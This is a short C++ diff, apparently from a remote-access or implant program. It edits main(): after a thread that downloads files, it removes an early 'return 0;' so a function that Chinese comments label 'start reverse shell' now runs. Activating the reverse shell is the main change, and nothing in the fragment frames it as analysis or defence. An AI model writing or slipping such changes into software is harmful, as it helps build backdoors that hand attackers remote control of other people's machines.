@@ -121,8 +121,6 @@ int main()
     auto th = std::thread(start_file_get);
     th.join();//之后的定时任务可能会使用到下载的文件，所以等待此线程
 
-    return 0;
-
     //启动反弹shell
     shell_start(thread_vec);
 
